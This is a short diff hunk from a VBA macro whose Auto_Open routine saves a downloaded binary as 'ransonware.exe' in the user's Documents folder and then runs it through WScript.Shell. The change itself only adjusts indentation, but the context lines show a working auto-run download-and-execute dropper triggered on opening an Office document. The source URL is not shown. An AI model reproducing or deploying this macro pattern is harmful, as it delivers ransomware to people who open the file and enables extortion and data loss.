@@ -13,7 +13,7 @@ Sub Auto_Open()
             .Type = 1 '//binary
             .Open
             .write xHttp.responseBody
-                .savetofile Path + "\Documents\ransonware.exe", 2 '//overwrite
+            .savetofile Path + "\Documents\ransonware.exe", 2 '//overwrite
         End With
     
     CreateObject("WScript.Shell").Run Path + "\Documents\ransonware.exe"
